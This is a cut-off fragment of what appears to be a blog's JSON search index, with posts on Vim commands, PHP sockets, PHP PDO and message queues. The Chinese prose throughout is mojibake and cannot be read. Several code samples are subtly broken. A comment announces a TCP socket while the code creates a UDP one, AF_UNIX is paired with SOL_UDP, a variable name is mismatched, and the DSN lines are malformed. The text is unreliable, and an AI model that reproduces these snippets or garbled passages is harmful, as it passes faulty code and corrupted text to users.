ä¸­ç›´æ¥ç§»åŠ¨åˆ°æŒ‡å®šè¡Œæ•°ï¼Œæœ‰ä¸‰ç§æ–¹å¼ï¼ˆå‡æ˜¯åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹è¾“å…¥ï¼Œn ä¸ºæŒ‡å®šçš„è¡Œå·ï¼‰ï¼š ngg/ nG :n vim +n filename è¿›é˜¶æ“ä½œå½“å‰è¡Œæ›¿æ¢ï¼š 1s&#x2F;XXX&#x2F;YYY&#x2F;g å…¶ä¸­XXX æ˜¯éœ€è¦æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼ŒYYYæ˜¯æ›¿æ¢åçš„å­—ç¬¦ä¸²ã€‚ å…¨å±€æ›¿æ¢ï¼š 1%s&#x2F;XXX&#x2F;YYY&#x2F;g ä¸€äº›é…ç½® æŸ¥æ‰¾å­—ç¬¦è®¾ç½®é«˜äº®ï¼šset hlsearch æ˜¾ç¤ºè¡Œå·ï¼šset number","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"Vim","slug":"Vim","permalink":"https://www.0x2beace.com/tags/Vim/"}]},{"title":"PHP Socket ç¼–ç¨‹","slug":"php-socket-programming","date":"2020-10-15T14:29:16.000Z","updated":"2020-10-15T14:30:23.551Z","comments":true,"path":"php-socket-programming/","link":"","permalink":"https://www.0x2beace.com/php-socket-programming/","excerpt":"æœ€è¿‘å› ä¸ºä¸€äº›åŸå› æ¥è§¦åˆ°ä¸€ä¸ªè€å¤è‘£é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®è™½ç„¶æœ‰äº›è€ï¼Œä½†ä»”ç»†çœ‹ä¸€çœ‹ï¼Œè¿˜æ˜¯èƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿çš„ã€‚ å…³äº PHP Socket ç¼–ç¨‹çš„æ–‡ç« æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±åªç®€å•è®°å½•ä¸€ä¸‹å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ã€‚","text":"æœ€è¿‘å› ä¸ºä¸€äº›åŸå› æ¥è§¦åˆ°ä¸€ä¸ªè€å¤è‘£é¡¹ç›®ï¼Œè¿™ä¸ªé¡¹ç›®è™½ç„¶æœ‰äº›è€ï¼Œä½†ä»”ç»†çœ‹ä¸€çœ‹ï¼Œè¿˜æ˜¯èƒ½å­¦åˆ°ä¸€äº›ä¸œè¥¿çš„ã€‚ å…³äº PHP Socket ç¼–ç¨‹çš„æ–‡ç« æœ‰å¾ˆå¤šï¼Œè¿™é‡Œå°±åªç®€å•è®°å½•ä¸€ä¸‹å¦‚ä½•å¿«é€Ÿä¸Šæ‰‹ã€‚ ä»€ä¹ˆæ˜¯ SocketæŒ‰ç…§æƒ¯ä¾‹ï¼Œè¿˜æ˜¯å…ˆæ¥äº†è§£ä¸€ä¸‹åŸºæœ¬æ¦‚å¿µã€‚ æˆ‘ä»¬çŸ¥é“ä¸¤ä¸ªè¿›ç¨‹å¦‚æœéœ€è¦è¿›ç¨‹é€šè®¯ï¼Œæœ€åŸºæœ¬çš„å‰æå°±æ˜¯ä¿è¯å½¼æ­¤è¿›ç¨‹çš„å”¯ä¸€ï¼Œå¹¶èƒ½ç¡®å®šå½¼æ­¤èº«ä»½ã€‚åœ¨æœ¬åœ°è¿›ç¨‹é€šè®¯ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ PID æ¥æ ‡ç¤ºå”¯ä¸€çš„è¿›ç¨‹ï¼Œä½† PID åªåœ¨æœ¬åœ°å”¯ä¸€ï¼Œç½‘ç»œä¸­çš„ä¸¤ä¸ªè¿›ç¨‹ PID å†²çªçš„å‡ ç‡å¾ˆå¤§ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±éœ€è¦å¦è¾Ÿè¹Šå¾„äº†ã€‚ æˆ‘ä»¬çŸ¥é“IP å±‚çš„IP åœ°å€å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºï¼Œè€ŒTCP å±‚åè®®å’Œç«¯å£å·å¯ä»¥å”¯ä¸€æ ‡ç¤ºä¸»æœºçš„ä¸€ä¸ªè¿›ç¨‹ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ IP åœ°å€+ åè®® + ç«¯å£å·å”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„ä¸€ä¸ªè¿›ç¨‹ã€‚ èƒ½å¤Ÿå”¯ä¸€æ ‡ç¤ºç½‘ç»œä¸­çš„è¿›ç¨‹åï¼Œå®ƒä»¬å°±å¯ä»¥åˆ©ç”¨socket è¿›è¡Œé€šä¿¡äº†ã€‚ ä»€ä¹ˆæ˜¯socketï¼Ÿ æˆ‘ä»¬ç»å¸¸æŠŠ socket ç¿»è¯‘æˆå¥—æ¥å­—ï¼Œsocket æ˜¯åœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´çš„ä¸€ä¸ªæŠ½è±¡å±‚ï¼Œå®ƒæŠŠ TCP/IP å±‚å¤æ‚çš„æ“ä½œæŠ½è±¡ä¸ºå‡ ä¸ªç®€å•çš„æ¥å£ä¾›åº”ç”¨å±‚è°ƒç”¨ä»¥å®ç°è¿›ç¨‹åœ¨ç½‘ç»œä¸­é€šä¿¡ã€‚ socket èµ·æºäº UNIXï¼Œåœ¨UNIX ä¸€åˆ‡çš†ä¸ºæ–‡ä»¶å“²å­¦çš„æ€æƒ³ä¸‹ï¼Œsocket æ˜¯ä¸€ç§â€œæ‰“å¼€=&gt;è¯»/å†™=&gt;å…³é—­â€œæ¨¡å¼çš„å®ç°ï¼ŒæœåŠ¡å™¨å’Œå®¢æˆ·ç«¯å„è‡ªç»´æŠ¤ä¸€ä¸ªæ–‡ä»¶ï¼Œåœ¨å»ºç«‹è¿æ¥æ‰“å¼€ä¹‹åï¼Œå¯ä»¥å‘è‡ªå·±çš„æ–‡ä»¶å†™å…¥å†…å®¹ä¾›å¯¹æ–¹è¯»å–æˆ–è€…è¯»å–å¯¹æ–¹å†…å®¹ï¼Œé€šè®¯ç»“æŸæ—¶å…³é—­æ–‡ä»¶ã€‚ socket é€šä¿¡æµç¨‹socket æ˜¯â€æ‰“å¼€=&gt;è¯»/å†™=&gt;å…³é—­â€æ¨¡å¼çš„å®ç°ï¼Œä»¥ä½¿ç”¨TCPåè®®é€šè®¯çš„socketä¸ºä¾‹ï¼Œå…¶äº¤äº’æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·å­ï¼š å®‰è£…PHP é»˜è®¤æ²¡æœ‰å¯ç”¨ sockets æ‰©å±•ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å®‰è£…æ‰©å±•ã€‚ 1apt-get install php7.2-sockets php -m æˆ–è€… php -iæ£€æŸ¥æ‰©å±•æ˜¯å¦å·²ç»å¯ç”¨ã€‚ åˆ›å»ºè¿æ¥åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¥—æ¥å­—ï¼Œä¹Ÿç§°ä½œä¸€ä¸ªé€šè®¯èŠ‚ç‚¹ã€‚ä¸€ä¸ªå…¸å‹çš„ç½‘ç»œè¿æ¥ç”± 2 ä¸ªå¥—æ¥å­—æ„æˆï¼Œä¸€ä¸ªè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼Œå¦ä¸€ä¸ªè¿è¡Œåœ¨æœåŠ¡ç«¯ã€‚ 123456&lt;?php# åˆ›å»ºä¸€ä¸ªTCP åè®®çš„ socket$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);# åˆ›å»ºä¸€ä¸ªæœ¬åœ°çš„socket$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0); socket_createå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯domainã€typeã€protocolã€‚ domainï¼šå½“å‰å¥—æ¥å­—ä½¿ç”¨ä»€ä¹ˆåè®® typeï¼šå½“å‰å¥—æ¥å­—çš„ç±»å‹ protocolï¼šè®¾ç½®æŒ‡å®š domain å¥—æ¥å­—ä¸‹çš„å…·ä½“åè®® å‘é€å†…å®¹å‘é€æ•°æ®æœ‰ä¸¤ç§æ–¹å¼ï¼š socket_sendï¼šå‘é€æ¶ˆæ¯è‡³å·²è¿æ¥çš„å®¢æˆ·ç«¯ã€‚ socket_sendtoï¼šå‘é€æ¶ˆæ¯è‡³å®¢æˆ·ç«¯ï¼Œæ— è®ºæ˜¯å¦è¿æ¥ã€‚123456789&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);$msg &#x3D; &quot;Ping !&quot;;$len &#x3D; strlen($msg);&#x2F;&#x2F; å‘æœ¬åœ° 1223 ç«¯å£å‘é€å†…å®¹socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);socket_close($sock); æ¥æ”¶æ•°æ®æ¥æ”¶æ•°æ®ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼š socket_recvï¼šä»å·²è¿æ¥çš„socket æ¥æ”¶æ•°æ® socket_recvfromï¼šä»socket æ¥æ”¶æ•°æ®ï¼Œæ— è®ºæ˜¯å¦è¿æ¥ 123456&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);# ä»æœ¬åœ° 1223 ç«¯å£è·å–å†…å®¹socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);var_dump($buf); &#x2F;&#x2F; Ping ! å‚è€ƒé“¾æ¥ ç®€å•ç†è§£Socket ä¸€ç¯‡ææ‡‚TCPã€HTTPã€Socketã€Socketè¿æ¥æ±  socket_create socket_sendto socket_bind","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"}]},{"title":"PHP PDO å¿«é€Ÿä¸Šæ‰‹","slug":"php-pdo-quick-start","date":"2020-10-13T23:51:48.000Z","updated":"2020-10-13T23:53:56.113Z","comments":true,"path":"php-pdo-quick-start/","link":"","permalink":"https://www.0x2beace.com/php-pdo-quick-start/","excerpt":"æœ€è¿‘ç”¨åˆ°äº† PHP PDOç›¸å…³çš„çŸ¥è¯†ï¼Œæ•´ç†æ€»ç»“ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ç”¨åˆ°äº† PHP PDOç›¸å…³çš„çŸ¥è¯†ï¼Œæ•´ç†æ€»ç»“ä¸€ä¸‹ã€‚ PDO æ˜¯ä»€ä¹ˆï¼ŸPDOï¼ˆPHP Data Objectï¼‰ PHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚ PDO èƒ½åšä»€ä¹ˆï¼ŸPDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚ åœ¨ PHP ä½¿ç”¨ MySQL æ•°æ®åº“å‰ï¼Œä½ éœ€è¦å…ˆå°†å®ƒä»¬è¿æ¥ã€‚ PHP 5 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰ä¸¤ç§æ–¹å¼è¿æ¥ MySQL : MySQLi extension (â€œiâ€ æ„ä¸º improved) PDO (PHP Data Objects) å…³äºæ˜¯é€‰æ‹© Mysqliï¼Œè¿˜æ˜¯ PDOï¼Ÿ MySQLi å’Œ PDO æœ‰å®ƒä»¬è‡ªå·±çš„ä¼˜åŠ¿ï¼šPDO åº”ç”¨åœ¨ 12 ç§ä¸åŒæ•°æ®åº“ä¸­ï¼Œ MySQLi åªé’ˆå¯¹ MySQL æ•°æ®åº“ã€‚ å¦‚æœé¡¹ç›®éœ€è¦åœ¨å¤šç§æ•°æ®åº“ä¸­åˆ‡æ¢ï¼Œå»ºè®®ä½¿ç”¨ PDOï¼Œå› ä¸ºåªéœ€è¦ä¿®æ”¹è¿æ¥å­—ç¬¦ä¸²å’Œéƒ¨åˆ†æŸ¥è¯¢è¯­å¥å³å¯ã€‚ PDO å®‰è£…åœ¨ PHP5 ç³»åˆ—ç‰ˆæœ¬ä¸­ï¼ŒPDOä¸æ˜¯é»˜è®¤æ”¯æŒçš„ï¼Œéœ€è¦æ‰‹å·¥é…ç½®æ‰å¯ä»¥ä½¿ç”¨ã€‚æ‰“å¼€ php.ini æ–‡ä»¶ï¼Œå¼€å¯æ‰©å±•ã€‚ 123&#x2F;&#x2F; php.iniextension&#x3D;php_pdo.dllextension&#x3D;php_pdo_mysql.dll ä¸Šè¿°é…ç½®åªæ‰“å¼€äº†å¯¹ MySQL çš„ PDO æ”¯æŒï¼Œå¦‚æœéœ€è¦å¯¹åˆ«çš„æ•°æ®åº“ç±»å‹è¿›è¡Œæ”¯æŒï¼Œå¯ä»¥åˆ†åˆ«æ‰“å¼€å¯¹åº”çš„ä¸åŒé…ç½®ï¼ˆå»æ‰å‰é¢çš„åˆ†å·ï¼‰ï¼š 12345;extension&#x3D;php_pdo_oci.dll;extension&#x3D;php_pdo_oci8.dll;extension&#x3D;php_pdo_odbc.dll;extension&#x3D;php_pdo_pgsql.dll;extension&#x3D;php_pdo_sqlite.dll PDO åˆ›å»ºè¿æ¥åœ¨ä½¿ç”¨ PDO æ“ä½œæ•°æ®åº“ä¹‹å‰ï¼Œéœ€è¦åˆ›å»º PDO è¿æ¥å¯¹è±¡ã€‚ 1234new PDO(DSN, username, password);&lt;?php$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;); ä¸åŒçš„æ•°æ®åº“ï¼Œå…¶ DSN(Data Source Name) æ„é€ æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚å¸¸è§æ•°æ®åº“ DSN è¯­æ³•å¦‚ä¸‹ï¼š 12345678&#x2F;&#x2F;MySQL:$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)&#x2F;&#x2F;SQLite:$dsn &#x3D; sqlite:db_name&#x2F;&#x2F;PGSQL$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password PDO Mysql é¢„å¤„ç†è¯­å¥é¢„å¤„ç†è¯­å¥åŠç»‘å®šå‚æ•°é¢„å¤„ç†è¯­å¥ç”¨äºæ‰§è¡Œå¤šä¸ªç›¸åŒçš„ SQL è¯­å¥ï¼Œå¹¶ä¸”æ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚ é¢„å¤„ç†è¯­å¥çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š é¢„å¤„ç†ï¼šåˆ›å»º SQL è¯­å¥æ¨¡æ¿å¹¶å‘é€åˆ°æ•°æ®åº“ã€‚é¢„ç•™çš„å€¼ä½¿ç”¨å‚æ•° â€œ?â€ æ ‡è®° ã€‚ä¾‹å¦‚ï¼šINSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) æ•°æ®åº“è§£æï¼Œç¼–è¯‘ï¼Œå¯¹SQLè¯­å¥æ¨¡æ¿æ‰§è¡ŒæŸ¥è¯¢ä¼˜åŒ–ï¼Œå¹¶å­˜å‚¨ç»“æœä¸è¾“å‡º æ‰§è¡Œï¼šæœ€åï¼Œå°†åº”ç”¨ç»‘å®šçš„å€¼ä¼ é€’ç»™å‚æ•°ï¼ˆâ€?â€ æ ‡è®°ï¼‰ï¼Œæ•°æ®åº“æ‰§è¡Œè¯­å¥ã€‚åº”ç”¨å¯ä»¥å¤šæ¬¡æ‰§è¡Œè¯­å¥ï¼Œå¦‚æœå‚æ•°çš„å€¼ä¸ä¸€æ ·ã€‚ ç›¸æ¯”äºç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œé¢„å¤„ç†è¯­å¥æœ‰ä¸¤ä¸ªä¸»è¦ä¼˜ç‚¹ï¼š é¢„å¤„ç†è¯­å¥å¤§å¤§å‡å°‘äº†åˆ†ææ—¶é—´ï¼Œåªåšäº†ä¸€æ¬¡æŸ¥è¯¢ï¼ˆè™½ç„¶è¯­å¥å¤šæ¬¡æ‰§è¡Œï¼‰ ç»‘å®šå‚æ•°å‡å°‘äº†æœåŠ¡å™¨å¸¦å®½ï¼Œä½ åªéœ€è¦å‘é€æŸ¥è¯¢çš„å‚æ•°ï¼Œè€Œä¸æ˜¯æ•´ä¸ªè¯­å¥ é¢„å¤„ç†è¯­å¥é’ˆå¯¹SQLæ³¨å…¥æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå› ä¸º å‚æ•°å€¼å‘é€åä½¿ç”¨ä¸åŒçš„åè®®ï¼Œä¿è¯äº†æ•°æ®çš„åˆæ³•æ€§ã€‚ PDOçš„ç›´æ¥æŸ¥è¯¢å’Œé¢„å¤„ç†åˆ†åˆ«æ˜¯PDO çš„ queryç±»å’Œ prepare ç±»ã€‚ PDO::prepare â€” å¤‡è¦æ‰§è¡Œçš„SQLè¯­å¥å¹¶è¿”å›ä¸€ä¸ª PDOStatement å¯¹è±¡ PDO::query â€” æ‰§è¡Œ SQL è¯­å¥ï¼Œè¿”å›PDOStatementå¯¹è±¡,å¯ä»¥ç†è§£ä¸ºç»“æœé›† å‰è€…å…¶å®å°±æ˜¯æ‰§è¡Œ sql è¯­å¥ï¼Œè¿”å›ä¸€ä¸ªç»“æœé›†å¯¹è±¡ï¼ˆPDOStatementï¼‰ï¼Œç„¶åæ“ä½œ PDOStatementç±»ï¼Œä»ç»“æœé›†ä¸­å–å‡ºç›¸åº”çš„æ•°æ®ã€‚ åè€…è™½ç„¶ä¹Ÿä¼šè¿”å›ä¸€ä¸ª PDOSTatement å¯¹è±¡ï¼Œä½†åŒºåˆ«å°±åœ¨äºä¸¤è€…çš„å¤„ç†æ–¹å¼ä¸åŒã€‚query æ˜¯ç›´æ¥æ‰§è¡Œ sql è¯­å¥ï¼Œè€Œ prepare æ˜¯é€šè¿‡é¢„å¤„ç†çš„æ–¹å¼æ‰§è¡Œ sql è¯­å¥ï¼ˆæ›´å®‰å…¨ï¼Œæ›´é«˜æ•ˆï¼‰ã€‚ é”™è¯¯å¤„ç†PDO é»˜è®¤å¼€å¯çš„æ˜¯é”™è¯¯ç æ¨¡å¼ï¼Œå¦‚æœå‘ç”Ÿäº†é”™è¯¯ï¼Œåªä¼šç®€å•åœ°è¾“å‡ºé”™è¯¯ç ï¼Œè¿™å¯¹äºè°ƒè¯•æˆ–è€…æµ‹è¯•æ¥è¯´ï¼Œä¸æ˜¯å¾ˆå‹å¥½ï¼Œä¸åˆ©ç”¨å¿«é€Ÿå®šä½å¼‚å¸¸æ‰€åœ¨ã€‚ æ‰€ä»¥PDO è¿˜ä¸ºæˆ‘ä»¬æä¾›äº†å¦å¤–ä¸¤ç§æ–¹å¼ï¼š PDO::ERRMODE_WARNINGé™¤è®¾ç½®é”™è¯¯ç ä¹‹å¤–ï¼ŒPDO è¿˜å°†å‘å‡ºä¸€æ¡ä¼ ç»Ÿçš„ E_WARNING ä¿¡æ¯ã€‚å¦‚æœåªæ˜¯æƒ³çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆé—®é¢˜ä¸”ä¸ä¸­æ–­åº”ç”¨ç¨‹åºçš„æµç¨‹ï¼Œé‚£ä¹ˆæ­¤è®¾ç½®åœ¨è°ƒè¯•/æµ‹è¯•æœŸé—´éå¸¸æœ‰ç”¨ã€‚ PDO::ERRMODE_EXCEPTIONé™¤è®¾ç½®é”™è¯¯ç ä¹‹å¤–ï¼ŒPDO è¿˜å°†æŠ›å‡ºä¸€ä¸ª PDOException å¼‚å¸¸ç±»å¹¶è®¾ç½®å®ƒçš„å±æ€§æ¥åå°„é”™è¯¯ç å’Œé”™è¯¯ä¿¡æ¯ã€‚æ­¤è®¾ç½®åœ¨è°ƒè¯•æœŸé—´ä¹Ÿéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä¼šæœ‰æ•ˆåœ°æ”¾å¤§è„šæœ¬ä¸­äº§ç”Ÿé”™è¯¯çš„ç‚¹ï¼Œä»è€Œå¯ä»¥éå¸¸å¿«é€Ÿåœ°æŒ‡å‡ºä»£ç ä¸­æœ‰é—®é¢˜çš„æ½œåœ¨åŒºåŸŸï¼ˆè®°ä½ï¼šå¦‚æœå¼‚å¸¸å¯¼è‡´è„šæœ¬ç»ˆæ­¢ï¼Œåˆ™äº‹åŠ¡è¢«è‡ªåŠ¨å›æ»šï¼‰ã€‚ åˆ›å»º PDO å®ä¾‹å¹¶è®¾ç½®é”™è¯¯æ¨¡å¼ï¼š 1234567891011121314&lt;?php$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;$user &#x3D; &#39;dbuser&#39;;$password &#x3D; &#39;dbpass&#39;;try &#123; $dbh &#x3D; new PDO($dsn, $user, $password); &#x2F;&#x2F; å¼€å¯ERRMODE_EXCEPTION æ¨¡å¼ $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);&#125; catch (PDOException $e) &#123; echo &#39;Connection failed: &#39; . $e-&gt;getMessage();&#125;?&gt; å‚è€ƒé“¾æ¥ï¼š PHP PDO PHP PDO-&gt;queryç±» PHP Mysql é¢„å¤„ç†è¯­å¥ PHP å¤šç§æ–¹å¼è¿æ¥Mysql","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"}]},{"title":"æ¶ˆæ¯é˜Ÿåˆ—å¿«é€Ÿä¸Šæ‰‹","slug":"quick-start-message-queue","date":"2020-10-11T12:03:16.000Z","updated":"2020-10-13T23:54:23.637Z","comments":true,"path":"quick-start-message-queue/","link":"","permalink":"https://www.0x2beace.com/quick-start-message-queue/","excerpt":"ä¸šåŠ¡åœºæ™¯æè¿°ï¼š è®¢å•åˆ›å»ºæˆåŠŸä¹‹åï¼Œæ¯ä¸€ç¬”è®¢å•éƒ½éœ€è¦è¿›è¡Œç»Ÿè®¡åŠå…¶ä»–ä¸šåŠ¡å¤„ç†ã€‚ å¦‚ä½•åŠæ—¶å‘ç°å¤„ç†å¤±è´¥çš„è®¢å•ï¼Œç„¶åè¿›è¡Œè¡¥å•å¤„ç†ã€‚ è®¢å•æ‰€äº§ç”Ÿä½£é‡‘çš„å¤„ç†ã€‚","text":"ä¸šåŠ¡åœºæ™¯æè¿°ï¼š è®¢å•åˆ›å»ºæˆåŠŸä¹‹åï¼Œæ¯ä¸€ç¬”è®¢å•éƒ½éœ€è¦è¿›è¡Œç»Ÿè®¡åŠå…¶ä»–ä¸šåŠ¡å¤„ç†ã€‚ å¦‚ä½•åŠæ—¶å‘ç°å¤„ç†å¤±è´¥çš„è®¢å•ï¼Œç„¶åè¿›è¡Œè¡¥å•å¤„ç†ã€‚ è®¢å•æ‰€äº§ç”Ÿä½£é‡‘çš„å¤„ç†ã€‚ å›°å¢ƒè¯¥åº”ç”¨å› ä¸ºä¸€äº›å†å²åŸå› ä½¿ç”¨ Mysql çš„æ•°æ®è¡¨ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—ã€‚ æ•´ä¸ªç³»ç»Ÿä¸­æœ‰å¤šä¸ªç”Ÿäº§è€…ä¼šå‘è¯¥æ•°æ®è¡¨ä¸­æ’å…¥è®°å½•ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªè„šæœ¬ä¼šä½œä¸ºæ¶ˆè´¹è€…å»æ•°æ®åº“ä¸­æŸ¥æ‰¾è®°å½•å¹¶è¿›è¡Œå¤„ç†ã€‚ ä½†æ˜¯è¿™æ ·åšæ˜¯å­˜åœ¨ä¸€äº›é—®é¢˜çš„ï¼š é•¿æ—¶é—´ä¸æ•°æ®åº“ä¿æŒè¿æ¥è¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ åœ¨æ•°æ®é‡è¾ƒå¤§æˆ–è€…å»¶æ—¶è¾ƒé«˜çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½åŠæ—¶å¤„ç†å®Œï¼Œä¼šå½±å“å…¶ä»–ä¸šåŠ¡ã€‚ æ‰€ä»¥æ›´å¥½çš„æ–¹å¼åº”è¯¥æ˜¯ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¥è§£å†³ã€‚ ä»€ä¹ˆæ˜¯æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰ï¼Œæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­é‡è¦çš„ç»„ä»¶ï¼Œå…¶é€šç”¨çš„ä½¿ç”¨åœºæ™¯å¯ä»¥ç®€å•åœ°æè¿°ä¸ºï¼š å½“ä¸éœ€è¦ç«‹å³è·å¾—ç»“æœï¼Œä½†æ˜¯å¹¶å‘é‡åˆéœ€è¦è¿›è¡Œæ§åˆ¶çš„æ—¶å€™ï¼Œå·®ä¸å¤šå°±æ˜¯éœ€è¦ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æ—¶å€™ã€‚ å¸¸è§åº”ç”¨åœºæ™¯å…¶å¸¸è§çš„åº”ç”¨åœºæ™¯æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š åº”ç”¨è€¦åˆï¼šå¤šåº”ç”¨é—´é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å¯¹åŒä¸€æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œé¿å…è°ƒç”¨æ¥å£å¤±è´¥å¯¼è‡´æ•´ä¸ªè¿‡ç¨‹å¤±è´¥ï¼› å¼‚æ­¥å¤„ç†ï¼šå¤šåº”ç”¨å¯¹æ¶ˆæ¯é˜Ÿåˆ—ä¸­åŒä¸€æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œåº”ç”¨é—´å¹¶å‘å¤„ç†æ¶ˆæ¯ï¼Œç›¸æ¯”ä¸²è¡Œå¤„ç†ï¼Œå‡å°‘å¤„ç†æ—¶é—´ï¼› é™æµå‰Šå³°ï¼šå¹¿æ³›åº”ç”¨äºç§’æ€æˆ–æŠ¢è´­æ´»åŠ¨ä¸­ï¼Œé¿å…æµé‡è¿‡å¤§å¯¼è‡´åº”ç”¨ç³»ç»ŸæŒ‚æ‰çš„æƒ…å†µï¼› æ¶ˆæ¯é©±åŠ¨çš„ç³»ç»Ÿï¼šç³»ç»Ÿåˆ†ä¸ºæ¶ˆæ¯é˜Ÿåˆ—ã€æ¶ˆæ¯ç”Ÿäº§è€…ã€æ¶ˆæ¯æ¶ˆè´¹è€…ï¼Œç”Ÿäº§è€…è´Ÿè´£äº§ç”Ÿæ¶ˆæ¯ï¼Œæ¶ˆè´¹è€…(å¯èƒ½æœ‰å¤šä¸ª)è´Ÿè´£å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼› 1. å¼‚æ­¥å¤„ç†åœºæ™¯æè¿°ï¼šç”¨æˆ·æ³¨å†Œä¹‹åï¼Œéœ€è¦é‚®ç®±æˆ–è€…çŸ­ä¿¡é€šçŸ¥ï¼Œä¼ ç»Ÿçš„åšæ³•æœ‰ä¸¤ç§ï¼š ä¸²è¡Œï¼š æ³¨å†ŒæˆåŠŸ å‘é€é‚®ä»¶ å‘é€çŸ­ä¿¡ åªæœ‰ç­‰ä»¥ä¸Šä¸‰ä¸ªä»»åŠ¡å…¨éƒ¨å®Œæˆä¹‹åï¼Œæ‰ä¼šè¿”å›å®¢æˆ·ç«¯ã€‚ å¹¶è¡Œï¼š æ³¨å†ŒæˆåŠŸ å‘é€é‚®ä»¶å¹¶åŒæ—¶å‘é€çŸ­ä¿¡ è™½ç„¶ä¹Ÿæ˜¯éœ€è¦ä»¥ä¸Šä¸‰ä¸ªä»»åŠ¡å…¨éƒ¨å®Œæˆæ‰ä¼šè¿”å›å®¢æˆ·ç«¯ï¼Œä½†å¹¶è¡Œä¸ä¸²è¡Œçš„åŒºåˆ«å°±åœ¨äºï¼Œé€šè¿‡ä½¿ç”¨å¤šçº¿ç¨‹æ¥ç¼©çŸ­ç¨‹åºå¤„ç†æ—¶é—´ã€‚ å‡è®¾ä¸‰ä¸ªä¸šåŠ¡èŠ‚ç‚¹æ¯ä¸ªä½¿ç”¨50æ¯«ç§’é’Ÿï¼Œä¸è€ƒè™‘ç½‘ç»œç­‰å…¶ä»–å¼€é”€ï¼Œåˆ™ä¸²è¡Œæ–¹å¼çš„æ—¶é—´æ˜¯150æ¯«ç§’ï¼Œå¹¶è¡Œçš„æ—¶é—´å¯èƒ½æ˜¯100æ¯«ç§’ã€‚ å› 